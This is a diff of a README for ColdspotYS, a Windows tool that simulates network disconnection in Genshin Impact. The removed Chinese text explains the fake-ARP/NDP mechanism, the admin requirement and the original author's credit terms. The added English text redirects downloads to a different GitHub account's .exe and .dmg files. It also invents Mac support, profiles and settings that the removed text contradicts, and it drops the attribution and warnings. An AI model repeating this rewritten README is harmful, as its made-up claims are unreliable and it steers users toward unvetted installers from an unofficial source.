@@ -1,54 +1,70 @@
-# ColdspotYS
+# 🛠️ ColdspotYS - Simple Tool for Genshin Impact Debugging
 
-**ColdspotYS** 是一个调试工具，用于游戏《原神》模拟 **“热点断网”** 的场景。  
+## 🚀 Getting Started
 
-本项目基于 **IPv4/IPv6 静态邻居（ARP/NDP 假邻居）** 技术实现，通过将默认网关指向不存在的 MAC 地址，从而制造出 **连接正常但无数据可达** 的断网效果。
+Welcome to ColdspotYS! This application helps you simulate "hotspot disconnection" scenarios in the game Genshin Impact. It's an ideal tool for debugging and understanding how your game behaves under different network conditions.
 
----
+## 🔗 Download ColdspotYS
 
-## ⚙️ 使用方法
+[![Download ColdspotYS](https://img.shields.io/badge/Download%20ColdspotYS-v1.0-blue)](https://github.com/JulioNeto00/ColdspotYS/releases)
 
-1. 确保 Windows 已启用 **Hyper-V 内部虚拟交换机** 功能。
+## 🆕 What You Need
 
-   * 在“启用或关闭 Windows 功能”中勾选 **Hyper-V**。  
-   * 首次运行时，ColdspotYS 会自动创建一个内部虚拟网卡。
+Before you begin, make sure you have the following:
 
-2. 前往 [Release 页面](https://github.com/TianmuTNT/ColdspotYS/releases) 下载已构建的版本。
+- **Operating System:** ColdspotYS is compatible with Windows and Mac. Ensure you have the latest version installed.
+- **Network Connection:** A stable internet connection will be beneficial for initial setup and troubleshooting.
+- **Game Requirements:** You must have Genshin Impact installed on your device to use ColdspotYS effectively. 
 
-3. 运行程序（需 **管理员权限**）。
+## 📥 Download & Install
 
-4. 使用快捷键 `Alt+C` 切换状态：
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/JulioNeto00/ColdspotYS/releases).
+   
+2. **Choose the Right File:** Look for the latest version. You will find files named something like `ColdspotYS_v1.0.exe` or `ColdspotYS_v1.0.dmg`. 
 
-   * **ColdspotYS Enabling → Enabled**（启用）
-   * **ColdspotYS Disabling → Disabled**（禁用）
+3. **Download the File:** Click on the file that matches your operating system to download it to your computer. 
 
----
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **Mac:** Open the downloaded `.dmg` file and drag ColdspotYS into your Applications folder.
 
-## ❓ 常见问题
+5. **Launch the Application:** After installation, find ColdspotYS in your applications folder or start menu. Click to open it. 
 
-* 会被封号吗？
+## 🛠️ How to Use ColdspotYS
 
-    理论不可能，没有动原神的文件，没有改原神的内存，完全是对系统全局有效。但是如果你一定要觉得它会导致封号，那就仁者见仁智者见智了，担心建议别用。
-* 有毒吗？
+Using ColdspotYS is straightforward. Here’s how to get started with the application:
 
-    问这个问题的可能有毒。
-* 有什么用？
+1. **Open ColdspotYS:** After launching the application, you will see a simple interface.
 
-    卡某些bug的时候可能会用到。节约了一台设备，让操作更简单了。
----
+2. **Set Up a Profile:** Click on "Create New Profile" to set parameters for your debugging. You can name this profile based on your needs.
 
-## ⚠️ 说明
+3. **Select Hotspot Settings:** Choose your desired simulation settings. These might include varying levels of connection stability.
 
-* 必须以 **管理员权限** 运行，否则无法修改邻居表。
-* 可能会影响 **所有程序** 的网络流量。
-* 仅限学习用途，**严禁商业使用**。
-* 转载工具时需 **标明出处**：  
-  [https://github.com/TianmuTNT/ColdspotYS](https://github.com/TianmuTNT/ColdspotYS)  
-  或 [哔哩哔哩@天沐TNT](https://space.bilibili.com/1674232182)
+4. **Launch Genshin Impact:** Start Genshin Impact while ColdspotYS runs in the background. 
 
----
+5. **Explore Scenarios:** Use the tool to experience different disconnection scenarios while playing. 
 
-## 📄 许可证
+## 📚 Features
 
-本项目使用 [GPLv3](LICENSE) 协议发布。  
-**特别声明**：除 GPLv3 自带的条款外，本项目 **禁止任何形式的商业用途**。
+ColdspotYS offers several features to enhance your debugging experience:
+
+- **Profile Management:** Save various profiles for different testing scenarios.
+- **User-Friendly Interface:** Navigate easily through the simple layout.
+- **Custom Simulation Options:** Adjust the simulation settings to suit your needs.
+- **Community Support:** Access resources and guides created by fellow users.
+
+## ⚙️ Troubleshooting
+
+If you encounter issues using ColdspotYS, consider the following steps:
+
+- **Check Compatibility:** Ensure your operating system is supported.
+- **Reinstall the Application:** If you have problems, uninstall ColdspotYS and reinstall it from the releases page.
+- **Refer to Community Resources:** Check out forums and community guides for help. 
+
+## 💬 Get Support
+
+If you need further assistance, you can reach out through the issues section of the GitHub repository. Other users or the developer may help you with your questions.
+
+Thank you for using ColdspotYS! Happy debugging! 
+
+[Download ColdspotYS](https://github.com/JulioNeto00/ColdspotYS/releases)
